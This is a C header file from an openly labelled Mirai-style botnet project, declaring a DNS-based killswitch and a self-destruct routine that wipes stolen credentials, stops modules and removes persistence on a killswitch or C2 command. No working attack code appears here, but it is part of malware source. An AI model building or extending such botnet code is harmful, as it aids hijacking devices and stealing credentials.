/*
 * notnet - Modern Mirai-Style Botnet
 * killswitch.h - Global killswitch (#130)
 *
 * DNS-based author killswitch. The bot resolves the compile-time
 * killswitch_domain (config.h) at boot and on its own timer; if the
 * domain resolves to the kill address (default 127.0.0.1) the bot
 * runs the one-way self-destruct: wipe the credential buffer, stop
 * every module, remove persistence, exit 0. There is no runtime
 * config — the domain is baked in at build time
 * (-DKILLSWITCH_DOMAIN_DEFAULT="..."), so a stock binary cannot be
 * disarmed by its operator. The check is DNS, so it works even when
 * the operator's C2 is down.
 */
#ifndef NOTNET_KILLSWITCH_H
#define NOTNET_KILLSWITCH_H

#include "protocol.h"

/* Resolve the compile-time killswitch domain. Returns 1 if it
 * resolves to a kill address (KILLSWITCH_KILL_IP or 0.0.0.0), 0
 * otherwise. NXDOMAIN / unreachable / any other address = inert
 * (no-op). Silent on failure — bots must not leak their killswitch
 * in the logs. */
int killswitch_check(void);

/* The shared one-way door, used by both the killswitch and the C2
 * `kill` command: wipe the credential buffer, stop every module via
 * the plugin teardown callbacks, remove persistence, then latch
 * kill_pending so the main loop exits cleanly (lock removal, log
 * flush) with status 0. There is no un-kill. */
void kill_self(notnet_bot_t *bot, const char *reason);

#endif /* NOTNET_KILLSWITCH_H */
